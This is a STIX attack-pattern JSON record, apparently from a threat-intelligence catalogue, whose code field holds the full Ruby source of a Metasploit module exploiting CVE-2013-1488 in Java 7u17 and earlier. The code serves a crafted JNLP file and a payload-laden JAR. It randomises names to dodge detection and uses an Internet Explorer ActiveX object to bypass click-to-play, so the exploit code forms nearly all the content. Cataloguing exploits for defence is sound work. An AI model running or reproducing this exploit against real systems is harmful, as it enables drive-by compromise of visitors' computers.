{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b6c7e13a-1800-4dcf-9679-1d3f5dfda267",
    "created": "2024-08-14T17:05:46.882544Z",
    "modified": "2024-08-14T17:05:46.882548Z",
    "name": "Java Applet Driver Manager Privileged toString() Remote Code Execution",
    "description": " This module abuses the java.sql.DriverManager class where the toString() method is called over user supplied classes from a doPrivileged block. The vulnerability affects Java version 7u17 and earlier. This exploit bypasses click-to-play on Internet Explorer and throws a specially crafted JNLP file. This bypass is applicable mainly to IE, where Java Web Start can be launched automatically through the ActiveX control. Otherwise, the applet is launched without click-to-play bypass.  'License'       => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/browser/java_jre17_driver_manager.rb",
            "external_id": "java_jre17_driver_manager.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1488"
        },
        {
            "source_name": "reference",
            "url": "http://www.contextis.com/research/blog/java-pwn2own/"
        },
        {
            "source_name": "reference",
            "url": "http://immunityproducts.blogspot.com/2013/04/yet-another-java-security-warning-bypass.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({ :javascript => false })\n\n  def initialize( info = {} )\n\n    super( update_info( info,\n      'Name'          => 'Java Applet Driver Manager Privileged toString() Remote Code Execution',\n      'Description'   => %q{\n          This module abuses the java.sql.DriverManager class where the toString() method\n        is called over user supplied classes from a doPrivileged block. The vulnerability\n        affects Java version 7u17 and earlier. This exploit bypasses click-to-play on Internet Explorer\n        and throws a specially crafted JNLP file. This bypass is applicable mainly to IE, where Java\n        Web Start can be launched automatically through the ActiveX control. Otherwise, the\n        applet is launched without click-to-play bypass.\n      },\n      'License'       => MSF_LICENSE,\n      'Author'        =>\n        [\n          'James Forshaw', # Vulnerability discovery and Analysis\n          'juan vazquez' # Metasploit module\n        ],\n      'References'    =>\n        [\n          [ 'CVE', '2013-1488' ],\n          [ 'OSVDB', '91472' ],\n          [ 'BID', '58504' ],\n          [ 'URL', 'http://www.contextis.com/research/blog/java-pwn2own/' ],\n          [ 'URL', 'http://immunityproducts.blogspot.com/2013/04/yet-another-java-security-warning-bypass.html' ],\n          [ 'ZDI', '13-076' ]\n        ],\n      'Platform'      => %w{ java linux osx win },\n      'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },\n      'Targets'       =>\n        [\n          [ 'Generic (Java Payload)',\n            {\n              'Platform' => ['java'],\n              'Arch' => ARCH_JAVA,\n            }\n          ],\n          [ 'Windows x86 (Native Payload)',\n            {\n              'Platform' => 'win',\n              'Arch' => ARCH_X86,\n            }\n          ],\n          [ 'Mac OS X x86 (Native Payload)',\n            {\n              'Platform' => 'osx',\n              'Arch' => ARCH_X86,\n            }\n          ],\n          [ 'Linux x86 (Native Payload)',\n            {\n              'Platform' => 'linux',\n              'Arch' => ARCH_X86,\n            }\n          ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2013-01-10'\n    ))\n  end\n\n\n  def setup\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2013-1488\", \"Exploit.class\")\n    @exploit_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2013-1488\", \"FakeDriver.class\")\n    @driver_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2013-1488\", \"FakeDriver2.class\")\n    @driver2_class = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2013-1488\", \"META-INF\", \"services\", \"java.lang.Object\")\n    @object_services = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"cve-2013-1488\", \"META-INF\", \"services\", \"java.sql.Driver\")\n    @driver_services = File.open(path, \"rb\") {|fd| fd.read(fd.stat.size) }\n\n    @exploit_class_name = rand_text_alpha(\"Exploit\".length)\n    @exploit_class.gsub!(\"Exploit\", @exploit_class_name)\n\n    @jnlp_name = rand_text_alpha(8)\n\n    super\n  end\n\n  def jnlp_file\n    jnlp_uri = \"#{get_uri}/#{@jnlp_name}.jnlp\"\n\n    jnlp = %Q|\n<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<jnlp spec=\"1.0\" xmlns:jfx=\"http://javafx.com\" href=\"#{jnlp_uri}\">\n  <information>\n    <title>Applet Test JNLP</title>\n    <vendor>#{rand_text_alpha(8)}</vendor>\n    <description>#{rand_text_alpha(8)}</description>\n    <offline-allowed/>\n  </information>\n\n  <resources>\n    <j2se version=\"1.7+\" href=\"http://java.sun.com/products/autodl/j2se\" />\n    <jar href=\"#{rand_text_alpha(8)}.jar\" main=\"true\" />\n  </resources>\n  <applet-desc name=\"#{rand_text_alpha(8)}\" main-class=\"#{@exploit_class_name}\" width=\"1\" height=\"1\">\n    <param name=\"__applet_ssv_validated\" value=\"true\"></param>\n  </applet-desc>\n  <update check=\"background\"/>\n</jnlp>\n    |\n    return jnlp\n  end\n\n  def on_request_uri(cli, request)\n    print_status(\"handling request for #{request.uri}\")\n\n    case request.uri\n    when /\\.jnlp$/i\n      send_response(cli, jnlp_file, { 'Content-Type' => \"application/x-java-jnlp-file\" })\n    when /\\.jar$/i\n      jar = payload.encoded_jar\n      jar.add_file(\"#{@exploit_class_name}.class\", @exploit_class)\n      jar.add_file(\"FakeDriver.class\", @driver_class)\n      jar.add_file(\"FakeDriver2.class\", @driver2_class)\n      jar.add_file(\"META-INF/services/java.lang.Object\", @object_services)\n      jar.add_file(\"META-INF/services/java.sql.Driver\", @driver_services)\n      metasploit_str = rand_text_alpha(\"metasploit\".length)\n      payload_str = rand_text_alpha(\"payload\".length)\n      jar.entries.each { |entry|\n        entry.name.gsub!(\"metasploit\", metasploit_str)\n        entry.name.gsub!(\"Payload\", payload_str)\n        entry.data = entry.data.gsub(\"metasploit\", metasploit_str)\n        entry.data = entry.data.gsub(\"Payload\", payload_str)\n      }\n      jar.build_manifest\n\n      send_response(cli, jar, { 'Content-Type' => \"application/octet-stream\" })\n    when /\\/$/\n      payload = regenerate_payload(cli)\n      if not payload\n        print_error(\"Failed to generate the payload.\")\n        send_not_found(cli)\n        return\n      end\n      send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })\n    else\n      send_redirect(cli, get_resource() + '/', '')\n    end\n\n  end\n\n  def generate_html\n    jnlp_uri = \"#{get_uri}/#{@jnlp_name}.jnlp\"\n\n    # When the browser is IE, the ActvX is used in order to load the malicious JNLP, allowing click2play bypass\n    # Else an <applet> tag is used to load the malicious applet, this time there isn't click2play bypass\n    html = %Q|\n    <html>\n    <body>\n    <object codebase=\"http://java.sun.com/update/1.6.0/jinstall-6-windows-i586.cab#Version=6,0,0,0\" classid=\"clsid:5852F5ED-8BF4-11D4-A245-0080C6F74284\" height=0 width=0>\n    <param name=\"app\" value=\"#{jnlp_uri}\">\n    <param name=\"back\" value=\"true\">\n    <applet archive=\"#{rand_text_alpha(8)}.jar\" code=\"#{@exploit_class_name}.class\" width=\"1\" height=\"1\"></applet>\n    </object>\n    </body>\n    </html>\n    |\n    return html\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-10",
    "x_mitre_platforms": [
        "linux'"
    ]
}